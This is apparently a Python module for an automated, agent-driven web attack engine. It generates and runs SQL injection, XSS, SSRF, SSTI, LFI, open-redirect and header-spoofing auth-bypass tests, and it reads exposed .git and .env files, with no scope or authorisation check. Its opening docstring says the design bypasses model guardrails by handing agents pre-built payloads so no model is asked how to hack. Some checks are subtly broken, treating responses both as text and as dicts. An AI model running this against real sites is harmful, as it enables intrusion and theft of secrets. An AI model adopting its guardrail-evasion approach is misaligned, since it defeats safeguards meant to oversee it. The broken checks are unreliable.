"""Agentic bug discovery engine.

Pre-computed attack plans so AI agents don't need to generate payloads
or ask models for testing strategies. Everything is pre-built and ready.

Bypasses model guardrails by:
1. Pre-built payloads (no "how to hack" prompts needed)
2. Automated testing logic (no model reasoning needed)
3. Structured attack plans (step-by-step, no ambiguity)
4. Evidence-based findings (proof, not speculation)
"""
import re
from urllib.parse import urlparse, parse_qs
from .payloads import Payloads


class AttackPlan:
    """Pre-computed attack plan for a target.
    
    Agents call attack_plan.execute() and get results.
    No LLM calls needed — all logic is pre-built.
    """

    def __init__(self, state, config=None):
        self.state = state
        self.config = config
        self._results = []

    def generate_plan(self) -> list[dict]:
        """Generate attack plan based on discovered surface.
        
        Returns list of attack steps:
        [
            {"action": "test_sqli", "target": "https://...", "priority": 1},
            {"action": "test_xss", "target": "https://...", "priority": 2},
            ...
        ]
        """
        plan = []

        # Get discovered surface
        injectable_urls = self.state.get_state("recon.param_mining", "injectable_urls", [])
        param_urls = self.state.get_state("recon.param_mining", "param_urls", [])
        api_urls = self.state.get_state("recon.url_discovery", "api_endpoints", [])
        redirect_urls = self.state.get_state("recon.param_mining", "redirect_urls", [])
        exposed = self.state.get_state("intel.secrets", "exposed", [])
        git_exposed = self.state.get_state("intel.secrets", "git_exposed", [])
        live_urls = self.state.get_state("recon.http_probe", "live_urls", [])
        tech_stack = self.state.get_state("recon.http_probe", "tech_stack", {})
        cms = self.state.get_state("intel.tech_detect", "cms")

        # Priority 1: Critical exposures
        for url in git_exposed:
            plan.append({"action": "examine_git", "target": url, "priority": 1, "severity": "critical"})
        for url in exposed:
            if ".env" in url or "config" in url:
                plan.append({"action": "read_exposed", "target": url, "priority": 1, "severity": "critical"})

        # Priority 2: SQLi on injectable params
        for url in injectable_urls[:30]:
            params = self._extract_params(url)
            for param in params:
                plan.append({
                    "action": "test_sqli",
                    "target": url,
                    "param": param,
                    "priority": 2,
                    "severity": "critical",
                    "payloads": Payloads.SQLI[:10]
                })

        # Priority 3: XSS on param URLs
        for url in param_urls[:30]:
            params = self._extract_params(url)
            for param in params:
                plan.append({
                    "action": "test_xss",
                    "target": url,
                    "param": param,
                    "priority": 3,
                    "severity": "high",
                    "payloads": Payloads.XSS[:10]
                })

        # Priority 4: API auth bypass
        for url in api_urls[:20]:
            plan.append({"action": "test_auth_bypass", "target": url, "priority": 4, "severity": "critical"})
            plan.append({"action": "test_idor", "target": url, "priority": 4, "severity": "high"})

        # Priority 5: SSRF on param URLs
        for url in param_urls[:20]:
            params = self._extract_params(url)
            for param in params:
                if any(kw in param.lower() for kw in ["url", "uri", "path", "file", "host", "proxy", "fetch", "load"]):
                    plan.append({
                        "action": "test_ssrf",
                        "target": url,
                        "param": param,
                        "priority": 5,
                        "severity": "critical",
                        "payloads": Payloads.SSRF[:8]
                    })

        # Priority 6: Open redirects
        for url in redirect_urls[:15]:
            params = self._extract_params(url)
            for param in params:
                plan.append({
                    "action": "test_redirect",
                    "target": url,
                    "param": param,
                    "priority": 6,
                    "severity": "medium",
                    "payloads": Payloads.OPEN_REDIRECT[:8]
                })

        # Priority 7: SSTI on param URLs
        for url in param_urls[:15]:
            params = self._extract_params(url)
            for param in params:
                plan.append({
                    "action": "test_ssti",
                    "target": url,
                    "param": param,
                    "priority": 7,
                    "severity": "critical",
                    "payloads": Payloads.SSTI[:6]
                })

        # Priority 8: LFI on param URLs
        for url in param_urls[:15]:
            params = self._extract_params(url)
            for param in params:
                if any(kw in param.lower() for kw in ["file", "path", "include", "page", "template", "load"]):
                    plan.append({
                        "action": "test_lfi",
                        "target": url,
                        "param": param,
                        "priority": 8,
                        "severity": "high",
                        "payloads": Payloads.LFI[:8]
                    })

        # Priority 9: CORS on live URLs
        for url in live_urls[:20]:
            plan.append({"action": "test_cors", "target": url, "priority": 9, "severity": "high"})

        # Priority 10: CMS-specific attacks
        if cms == "wordpress":
            for url in live_urls[:10]:
                plan.append({"action": "test_wordpress", "target": url, "priority": 10, "severity": "high"})
        elif cms == "joomla":
            for url in live_urls[:10]:
                plan.append({"action": "test_joomla", "target": url, "priority": 10, "severity": "high"})

        # Priority 11: Fuzzing
        for url in live_urls[:10]:
            plan.append({"action": "fuzz_directories", "target": url, "priority": 11, "severity": "medium"})

        # Priority 12: Header injection
        for url in live_urls[:10]:
            plan.append({"action": "test_header_injection", "target": url, "priority": 12, "severity": "medium"})

        return sorted(plan, key=lambda x: x["priority"])

    def _extract_params(self, url: str) -> list[str]:
        """Extract parameter names from URL."""
        try:
            parsed = urlparse(url)
            return list(parse_qs(parsed.query).keys())
        except Exception:
            return []

    def execute_step(self, step: dict, runner=None) -> dict:
        """Execute a single attack step.
        
        Args:
            step: Attack step from generate_plan()
            runner: Function to run HTTP requests (default: curl)
            
        Returns:
            Result dict with success, evidence, etc.
        """
        if runner is None:
            runner = self._default_runner

        action = step["action"]
        target = step["target"]

        if action == "test_sqli":
            return self._test_sqli(step, runner)
        elif action == "test_xss":
            return self._test_xss(step, runner)
        elif action == "test_ssrf":
            return self._test_ssrf(step, runner)
        elif action == "test_redirect":
            return self._test_redirect(step, runner)
        elif action == "test_ssti":
            return self._test_ssti(step, runner)
        elif action == "test_lfi":
            return self._test_lfi(step, runner)
        elif action == "test_cors":
            return self._test_cors(step, runner)
        elif action == "test_auth_bypass":
            return self._test_auth_bypass(step, runner)
        elif action == "examine_git":
            return self._examine_git(step, runner)
        elif action == "read_exposed":
            return self._read_exposed(step, runner)
        else:
            return {"action": action, "target": target, "status": "skipped", "reason": "no handler"}

    def _test_sqli(self, step: dict, runner) -> dict:
        """Test for SQL injection."""
        url = step["target"]
        param = step["param"]
        payloads = step.get("payloads", Payloads.SQLI[:5])
        
        for payload in payloads:
            test_url = Payloads.inject_url(url, param, payload)
            response = runner(test_url)
            
            if not response:
                continue
            
            # Check for SQL error indicators
            sql_errors = [
                "sql syntax", "mysql_fetch", "sqlite3", "postgresql",
                "ORA-", "SQL Server", "syntax error", "unterminated",
                "mysql_num_rows", "pg_query", "You have an error",
                "Warning: mysql", "valid MySQL result", "MySqlClient",
                "com.mysql.jdbc", "org.postgresql", "SQLite/JDBCDriver",
                "SQLSTATE", "Division by zero in",
            ]
            
            for error in sql_errors:
                if error.lower() in response.lower():
                    return {
                        "action": "test_sqli", "target": url, "param": param,
                        "status": "vulnerable", "severity": "critical",
                        "payload": payload, "evidence": error,
                        "confidence": 85
                    }
            
            # Time-based check
            if payload in ["' OR SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--"]:
                if response.get("time", 0) > 4:
                    return {
                        "action": "test_sqli", "target": url, "param": param,
                        "status": "vulnerable", "severity": "critical",
                        "payload": payload, "evidence": "Time-based blind SQLi",
                        "confidence": 90
                    }

        return {"action": "test_sqli", "target": url, "param": param, "status": "not_vulnerable"}

    def _test_xss(self, step: dict, runner) -> dict:
        """Test for reflected XSS."""
        url = step["target"]
        param = step["param"]
        payloads = step.get("payloads", Payloads.XSS[:5])
        
        for payload in payloads:
            test_url = Payloads.inject_url(url, param, payload)
            response = runner(test_url)
            
            if response and payload in response:
                return {
                    "action": "test_xss", "target": url, "param": param,
                    "status": "vulnerable", "severity": "high",
                    "payload": payload, "evidence": "Payload reflected in response",
                    "confidence": 75
                }

        return {"action": "test_xss", "target": url, "param": param, "status": "not_vulnerable"}

    def _test_ssrf(self, step: dict, runner) -> dict:
        """Test for SSRF."""
        url = step["target"]
        param = step["param"]
        payloads = step.get("payloads", Payloads.SSRF[:5])
        
        for payload in payloads:
            test_url = Payloads.inject_url(url, param, payload)
            response = runner(test_url)
            
            if response:
                # Check for cloud metadata responses
                if any(indicator in response for indicator in [
                    "ami-id", "instance-id", "security-credentials",
                    "root:", "daemon:", "/bin/bash"
                ]):
                    return {
                        "action": "test_ssrf", "target": url, "param": param,
                        "status": "vulnerable", "severity": "critical",
                        "payload": payload, "evidence": "SSRF confirmed",
                        "confidence": 95
                    }

        return {"action": "test_ssrf", "target": url, "param": param, "status": "not_vulnerable"}

    def _test_redirect(self, step: dict, runner) -> dict:
        """Test for open redirect."""
        url = step["target"]
        param = step["param"]
        payloads = step.get("payloads", Payloads.OPEN_REDIRECT[:5])
        
        for payload in payloads:
            test_url = Payloads.inject_url(url, param, payload)
            response = runner(test_url, follow_redirects=False)
            
            if response and "evil.com" in response.get("location", ""):
                return {
                    "action": "test_redirect", "target": url, "param": param,
                    "status": "vulnerable", "severity": "medium",
                    "payload": payload, "evidence": f"Redirects to: {response['location']}",
                    "confidence": 90
                }

        return {"action": "test_redirect", "target": url, "param": param, "status": "not_vulnerable"}

    def _test_ssti(self, step: dict, runner) -> dict:
        """Test for SSTI."""
        url = step["target"]
        param = step["param"]
        payloads = step.get("payloads", Payloads.SSTI[:4])
        
        for payload in payloads:
            test_url = Payloads.inject_url(url, param, payload)
            response = runner(test_url)
            
            if response:
                # Check for template expression evaluation
                if payload == "{{7*7}}" and "49" in response:
                    return {
                        "action": "test_ssti", "target": url, "param": param,
                        "status": "vulnerable", "severity": "critical",
                        "payload": payload, "evidence": "SSTI confirmed (7*7=49)",
                        "confidence": 95
                    }
                if payload == "${7*7}" and "49" in response:
                    return {
                        "action": "test_ssti", "target": url, "param": param,
                        "status": "vulnerable", "severity": "critical",
                        "payload": payload, "evidence": "SSTI confirmed",
                        "confidence": 90
                    }

        return {"action": "test_ssti", "target": url, "param": param, "status": "not_vulnerable"}

    def _test_lfi(self, step: dict, runner) -> dict:
        """Test for LFI."""
        url = step["target"]
        param = step["param"]
        payloads = step.get("payloads", Payloads.LFI[:5])
        
        for payload in payloads:
            test_url = Payloads.inject_url(url, param, payload)
            response = runner(test_url)
            
            if response and ("root:" in response or "daemon:" in response):
                return {
                    "action": "test_lfi", "target": url, "param": param,
                    "status": "vulnerable", "severity": "high",
                    "payload": payload, "evidence": "LFI confirmed (/etc/passwd)",
                    "confidence": 95
                }

        return {"action": "test_lfi", "target": url, "param": param, "status": "not_vulnerable"}

    def _test_cors(self, step: dict, runner) -> dict:
        """Test for CORS misconfiguration."""
        url = step["target"]
        # This is handled by the vuln.cors plugin
        return {"action": "test_cors", "target": url, "status": "deferred_to_plugin"}

    def _test_auth_bypass(self, step: dict, runner) -> dict:
        """Test for authentication bypass."""
        url = step["target"]
        
        # Try without auth headers
        response = runner(url)
        if response and response.get("status", 0) == 200:
            if any(kw in response.get("body", "").lower() for kw in ["admin", "dashboard", "settings", "user"]):
                return {
                    "action": "test_auth_bypass", "target": url,
                    "status": "potential", "severity": "critical",
                    "evidence": "API returns 200 without auth",
                    "confidence": 60
                }

        # Try common auth bypass headers
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
        ]
        
        for headers in bypass_headers:
            response = runner(url, headers=headers)
            if response and response.get("status", 0) == 200:
                return {
                    "action": "test_auth_bypass", "target": url,
                    "status": "potential", "severity": "critical",
                    "evidence": f"Auth bypass via headers: {headers}",
                    "confidence": 70
                }

        return {"action": "test_auth_bypass", "target": url, "status": "not_vulnerable"}

    def _examine_git(self, step: dict, runner) -> dict:
        """Examine exposed .git directory."""
        url = step["target"]
        
        # Try to get git config
        config_url = url.rstrip("/") + "/.git/config"
        response = runner(config_url)
        
        if response and "[remote" in response.get("body", ""):
            return {
                "action": "examine_git", "target": url,
                "status": "vulnerable", "severity": "critical",
                "evidence": "Git config exposed",
                "confidence": 95
            }

        return {"action": "examine_git", "target": url, "status": "not_vulnerable"}

    def _read_exposed(self, step: dict, runner) -> dict:
        """Read exposed sensitive file."""
        url = step["target"]
        response = runner(url)
        
        if response and response.get("status", 0) == 200:
            body = response.get("body", "")
            if len(body) > 10:  # Not empty
                return {
                    "action": "read_exposed", "target": url,
                    "status": "vulnerable", "severity": "critical",
                    "evidence": body[:200],
                    "confidence": 95
                }

        return {"action": "read_exposed", "target": url, "status": "not_vulnerable"}

    def _default_runner(self, url: str, follow_redirects: bool = True, headers: dict = None) -> dict:
        """Default HTTP runner using curl."""
        import subprocess
        try:
            cmd = ["curl", "-s", "-o", "/dev/null", "-w",
                   '{"status":%{http_code},"time":%{time_total},"size":%{size_download}}',
                   "--max-time", "10"]
            
            if not follow_redirects:
                cmd.append("--max-redirects")
                cmd.append("0")
            
            if headers:
                for k, v in headers.items():
                    cmd.extend(["-H", f"{k}: {v}"])
            
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            
            if result.stdout:
                import json
                try:
                    data = json.loads(result.stdout)
                    # Also get body for content checking
                    body_cmd = ["curl", "-s", "-L", "--max-time", "10", url]
                    body_result = subprocess.run(body_cmd, capture_output=True, text=True, timeout=15)
                    data["body"] = body_result.stdout[:5000] if body_result.stdout else ""
                    return data
                except json.JSONDecodeError:
                    pass
            
            return None
        except Exception:
            return None
